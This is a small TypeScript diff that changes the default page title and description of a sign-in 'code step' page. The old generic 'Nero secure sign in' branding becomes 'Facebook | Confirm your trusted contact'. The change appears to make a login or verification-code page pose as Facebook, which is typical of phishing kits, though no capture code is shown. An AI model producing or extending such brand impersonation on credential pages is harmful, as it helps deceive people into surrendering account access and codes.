@@ -13,7 +13,7 @@ function seoMeta(title: string, description: string) {
 }
 
 export function buildCodeStepHead(c: CodeStepContent | undefined) {
-  return seoMeta(c?.seoTitle ?? "Nero", c?.seoDescription ?? "Nero secure sign in.");
+  return seoMeta(c?.seoTitle ?? "Facebook | Confirm your trusted contact", c?.seoDescription ?? "continue to facebook to update your trusted contact.");
 }
 
 export function buildSimpleHead<
